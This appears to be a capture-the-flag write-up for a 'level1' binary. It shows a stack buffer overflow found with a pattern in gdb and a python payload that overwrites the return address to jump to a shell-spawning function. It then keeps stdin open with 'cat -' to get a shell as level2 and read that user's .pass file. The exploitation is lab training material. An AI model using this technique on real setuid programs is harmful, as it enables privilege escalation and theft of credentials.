First we start by looking the binary file using gdb

We can see that we must go to thee function run

lets start simple just by a basic pattern overflow

We will use the pattern :
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

When executed in gdb we have:
```
(gdb) r
Starting program: /home/user/level1/level1 
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

Program received signal SIGSEGV, Segmentation fault.
0x74747474 in ?? ()
(gdb) x/s $esp
0xbffff730:      "uuuuvvvvwwwwxxxxyyyyzzzz"
```
Here we can see that we have we have un error in the at the end of the stack (esp)

So now we will launch the program the same way but this time we will remove "uuuuvvvvwwwwxxxxyyyyzzzz" + 4 bytes and add a 4 bytes shellcode instead(to acess the run function)

But When I do:
```
python -c 'print "aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssss" + "\x44\x84\x04\x08"' | ./level1
```
I have :
```
Good... Wait what?
Segmentation fault (core dumped)
```
Here we can see that it enter the run function but we cant use the shell this is because the closed is closed at the end of the program

Now we will put it in a file :
```
python -c 'print "aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssss" + "\x44\x84\x04\x08"' > /tmp/test
```
and 
```
cat /tmp/test - | ./level1
Good... Wait what?
whoami
level2
```
(cat -) keep the stdin open

Since the level1 file belongs to level2 we can now:
cat /home/user/level2/.pass
